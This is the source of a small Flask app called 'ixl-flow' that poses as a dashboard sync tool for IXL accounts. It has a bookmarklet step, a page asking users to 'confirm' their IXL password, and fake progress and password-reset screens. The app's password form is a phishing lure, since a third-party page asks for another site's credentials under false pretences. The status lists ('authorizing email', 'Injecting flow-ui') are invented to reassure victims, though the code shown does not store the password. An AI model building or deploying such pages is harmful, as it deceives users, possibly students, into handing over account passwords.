from flask import Flask, request, jsonify, render_template_string
import asyncio

app = Flask(__name__)

# --- STYLES (Neon Green & Electric Blue) ---
STYLE = """
<style>
    body { background-color: #050505; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .card { background: #0d0d0d; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 0 30px rgba(0, 255, 127, 0.1); width: 400px; border: 1px solid #1a1a1a; }
    h1 span, h2 { color: #00ff7f; text-shadow: 0 0 10px rgba(0, 255, 127, 0.5); }
    .step { background: #141414; padding: 15px; border-radius: 10px; margin: 10px 0; text-align: left; border-left: 4px solid #00ccff; font-size: 14px; }
    input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #1a1a1a; background: #141414; color: white; box-sizing: border-box; outline: none; }
    input:focus { border-color: #00ccff; }
    .btn-glow { background: linear-gradient(90deg, #00ff7f, #00ccff); color: #000; padding: 12px 20px; border-radius: 30px; font-weight: bold; text-decoration: none; border:none; width: 100%; cursor: pointer; text-transform: uppercase; display: block; }
    .link-alt { color: #666; font-size: 12px; text-decoration: none; display: block; margin-top: 15px; transition: 0.3s; }
    .link-alt:hover { color: #00ccff; }
    ul { list-style: none; padding: 0; text-align: left; }
    li { margin: 12px 0; color: #333; font-size: 14px; display: flex; align-items: center; }
    li.done { color: #00ff7f; }
    li.active { color: #00ccff; font-weight: bold; }
    .dot { height: 8px; width: 8px; border-radius: 50%; display: inline-block; margin-right: 10px; background: #222; }
    li.done .dot { background: #00ff7f; box-shadow: 0 0 8px #00ff7f; }
    li.active .dot { background: #00ccff; box-shadow: 0 0 8px #00ccff; animation: pulse 1.5s infinite; }
    @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
</style>
"""

@app.route('/')
def home():
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h1>ixl-<span>flow</span></h1>
            <div class="step"><strong>1.</strong> Login to IXL in a new tab.</div>
            <div class="step"><strong>2.</strong> Drag this to your Bookmarks Bar:</div>
            <a class="btn-glow" href="javascript:(function(){{window.location.href='https://'+window.location.hostname+'/login';}})();">IXL SYNC</a>
        </div>
    </body></html>
    """)

@app.route('/login')
def login():
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h2>Link Account</h2>
            <p style="color: #666; font-size: 13px;">Confirm your password to sync the dashboard.</p>
            <form action="/run" method="POST">
                <input type="password" name="password" placeholder="IXL Password" required>
                <button type="submit" class="btn-glow">Connect Dashboard</button>
            </form>
            <a href="/reset" class="link-alt">I don't know my password</a>
        </div>
    </body></html>
    """)

@app.route('/reset')
def reset():
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h2 style="color: #00ccff;">Resetting Session</h2>
            <ul>
                <li class="done"><span class="dot"></span>checking credentials</li>
                <li class="done"><span class="dot"></span>authorizing email</li>
                <li class="active"><span class="dot"></span>waiting for reset link...</li>
                <li><span class="dot"></span>verifying token</li>
                <li><span class="dot"></span>finalizing sync</li>
            </ul>
            <p style="font-size: 11px; color: #444; margin-top: 20px;">Keep this tab open</p>
        </div>
    </body></html>
    """)

@app.route('/run', methods=['POST'])
def run():
    # This is the "Syncing Dashboard..." screen but with the actual UI
    return render_template_string(f"""
    <html><head>{STYLE}</head><body>
        <div class="card">
            <h2>Syncing Dashboard...</h2>
            <ul>
                <li class="active"><span class="dot"></span>Connecting to IXL servers</li>
                <li><span class="dot"></span>Injecting flow-ui</li>
                <li><span class="dot"></span>Finalizing</li>
            </ul>
        </div>
        <script>setTimeout(function(){{ window.location.href='/'; }}, 5000);</script>
    </body></html>
    """)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
